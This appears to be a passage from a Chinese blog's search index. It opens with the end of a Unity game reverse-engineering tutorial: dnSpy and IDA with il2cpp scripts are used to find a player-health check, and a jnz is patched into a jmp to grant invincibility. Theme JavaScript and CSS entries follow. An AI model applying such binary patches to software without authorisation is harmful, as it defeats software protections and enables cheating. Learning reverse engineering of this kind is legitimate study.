alt="image-20250528234206707"></p><p>用dnspy查看Assembly-CSharp.dll（来自dump后的文件中）的内容，找到playerhealth函数的内容，这里面主要是通过playerdied来判断角色是否死亡，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291523692.png" alt="image-20250528225350874"></p><p>用ida打开脱壳后的GameAssembly.dll文件，再附加文件，左上角file&#x2F;script file，附加ida_with_struct_py3.py和script.json文件，然后再加上il2cpp.h文件</p><p>等到加载完成之后，找到对应的playerhealth函数的位置，看汇编，找到对应位置，把下面的jnz改为jmp（强跳转）</p><p>ps：这里强跳转就是 把jnz对应的机器码0F 85改为jmp的机器码90 E9</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291523443.png" alt="image-20250528225834456"></p><p>修改成功之后就是这样，然后patch保存之后再重新运行游戏就是无敌状态了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291147003.png" alt="image-20250528231357969"></p>]]></content>
    
    
    <categories>
      
      <category>reverse-探索的过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unity逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[document  .querySelector('#web_bg')  .setAttribute('style', `background-image: ${document.querySelector('.banner').style.background.split(' ')[0]};position: fixed;width: 100%;height: 100%;z-index: -1;background-size: cover;`);document  .querySelector("#banner")  .setAttribute('style', 'background-image: url()')document  .querySelector("#banner .mask")  .setAttribute('style', 'background-color:rgba(0,0,0,0)')]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[const cards = document.querySelectorAll(".index-card");if (cards.length) {  document.querySelector(".row").setAttribute("style", "overflow: hidden;");  const coefficient = document.documentElement.clientWidth > 768 ? 0.5 : 0.3;  const origin =    document.documentElement.clientHeight -    cards[0].getBoundingClientRect().height * coefficient;  function throttle(fn, wait) {    let timer = null;    return function () {      const context = this;      const args = arguments;      if (!timer) {        timer = setTimeout(function () {          fn.apply(context, args);          timer = null;        }, wait);      }    };  }  function handle() {    cards.forEach((card) => {      card.setAttribute(        "style",        `--state: ${card.getBoundingClientRect().top - origin < 0 ? 1 : 0};`      );    });    console.log(1);  }  document.addEventListener("scroll", throttle(handle, 100));}]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[.index-card {  transition: all 0.5s;  transform: scale(calc(1.5 - 0.5 * var(--state)));  opacity: var(--state);  margin-bottom: 2rem;}.index-img img {  margin: 20px 0;}]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[a.card-body.hover-with-bg {  border-left: 5px solid rgba(255, 255, 255, 0.6); /* 白色半透 */  background: #00000080; /* 半透明黑背景 */  color: #fff;  box-shadow: 0 5px 10px #00000050;  transition: all 0.5s;}a.card-body.hover-with-bg img {  transition: all 5s;  border: 2px solid #fff;}a.card-body.hover-with-bg:hover img {  transform: rotate(1080deg);}.link-intro {  color: #293239;  font-weight: 600;  font-family: auto;}a.card-body.hover-with-bg:hover {  border-left-width: 15px;  border-left-color: rgba(255, 255, 255, 0.8); /* 悬停时稍微更亮一点 */  background-color: #fff;  color: #000; /* 白底时切换为黑字可读性更好 */}]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* 目录栏整体样式（右侧 toc） */#toc {  background-color: rgba(255, 255, 255, 0.2); /* 白色半透背景 */  -webkit-backdrop-filter: blur(25px);  backdrop-filter: blur(25px); /* 毛玻璃模糊 */  border-radius: 12px;  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* 柔和阴影 */  padding: 15px;  transition: all 0.3s ease;}/* 悬停时增强玻璃感 */#toc:hover {  background-color: rgba(255, 255, 255, 0.35);  box-shadow: 0 4px 25px rgba(0, 0, 0, 0.15);}/* 目录文字样式 */#toc a {  color: #000; /* 白色文字 */  font-weight: 500;  text-shadow: 0 0 4px rgba(0, 0, 0, 0.3); /* 提高在玻璃背景下的可读性 */  transition: color 0.3s;}/* 鼠标悬停在目录链接时的颜色变化 */#toc a:hover {  color: #72ffb7; /* 浅绿色高亮（你可以换成任何喜欢的颜色） */}]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* === 主内容区域毛玻璃背景（与右侧目录栏一致）=== */#board {  background-color: var(--board-bg-color);  border-radius: 15px;  box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);  -webkit-backdrop-filter: blur(15px);  backdrop-filter: blur(15px);  transition: all 0.3s ease;}/* === 目录栏（右侧）毛玻璃样式 === */#toc {  padding: 10px;  top: 4rem;  background-color: var(--board-bg-color);  border-radius: 15px;  box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);  -webkit-backdrop-filter: blur(15px);  backdrop-filter: blur(15px);  transition: all 0.3s ease;}]]></content>
    
  </entry>
  
  
  
</search>
